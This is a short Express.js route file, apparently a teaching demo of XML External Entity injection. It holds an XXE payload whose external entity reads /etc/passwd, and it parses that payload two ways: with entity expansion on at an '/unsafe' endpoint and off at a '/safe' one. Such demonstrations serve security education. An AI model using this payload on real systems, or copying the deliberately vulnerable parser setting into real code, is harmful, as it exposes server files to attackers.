'use strict';

const path = require('path');
const express = require('express');
const libxmljs = require('libxmljs');

const api = express.Router();
const view = path.resolve(__dirname, './views/index');

const ATTACK_XML = `
<!DOCTYPE read-fs [<!ELEMENT read-fs ANY >
<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
<users>
  <user>
    <read-fs>&passwd;</read-fs>
    <name>C.K Frode</name>
  </user>
</users>`;

api.get('/', (_, res) => res.render(view, { ATTACK_XML }));

api.post(['/safe', '/unsafe'], (req, res) => {
	let options;

	if (/\/safe$/.test(req.url)) {
		options = {
			noent: false
		};
	} else {
		options = {
			noent: true
		};
	}

	try {
		const parsedXML = libxmljs.parseXmlString(ATTACK_XML, options);
		res.send(parsedXML.toString());
	} catch(error) {
		res.status('400').send('Unable to process XML string');
	}
});

module.exports = api;
